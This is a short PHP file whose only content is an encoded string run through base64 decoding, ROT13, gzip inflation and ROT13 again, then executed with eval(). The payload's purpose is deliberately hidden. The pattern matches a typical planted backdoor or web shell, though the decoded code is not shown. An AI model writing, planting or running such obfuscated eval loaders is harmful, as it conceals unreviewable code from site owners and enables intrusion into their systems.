<?php
$code_ = "NY5OC8IgGED/ioeBE4bSIaikb4V6p4ho6jTc0M82TfKRgvv1RNT9vcfLfCBb4p1WetQRZRoAbbsRwlkDf1II7uksGt92QA3carOAIerHbbUUNmBXb54soBFm7yyHESiT35pS6G3IMx8KZanV7WOsTdVHtSoraC5C11MVccFxc9C6BP8HHNF/HCbxPqWc7mqU/xAm3w==";
eval(str_rot13(gzinflate(str_rot13(base64_decode($code_)))));
?>